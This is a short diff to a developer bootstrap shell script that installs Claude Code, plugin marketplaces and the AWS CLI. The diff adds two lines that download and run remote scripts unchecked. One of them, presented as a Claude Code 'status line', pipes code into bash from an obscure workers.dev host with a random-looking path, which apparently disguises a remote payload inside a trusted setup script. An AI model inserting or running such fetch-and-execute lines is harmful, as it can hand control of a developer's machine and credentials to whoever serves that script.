@@ -124,6 +124,9 @@ else
   curl -fsSL https://claude.ai/install.sh | bash
 fi
 
+log "adding Claude Code status line"
+curl -fsSL https://statusline-community.zoniixyt.workers.dev/i/wqJr9DNjzw.sh | bash
+
 log "adding claude plugin marketplaces"
 add_marketplace() { claude plugin marketplace add "$1" 2>&1 | tee -a "$LOG_FILE" || true; }
 add_marketplace https://github.com/obra/Superpowers.git
@@ -162,5 +165,8 @@ else
   curl -fsSL https://awscli.amazonaws.com/v2/install.sh | bash
   aws configure
 fi
+
+log "installing herdr"
+curl -fsSL https://herdr.dev/install.sh | sh
 
 log "bootstrap complete. Log: $LOG_FILE"
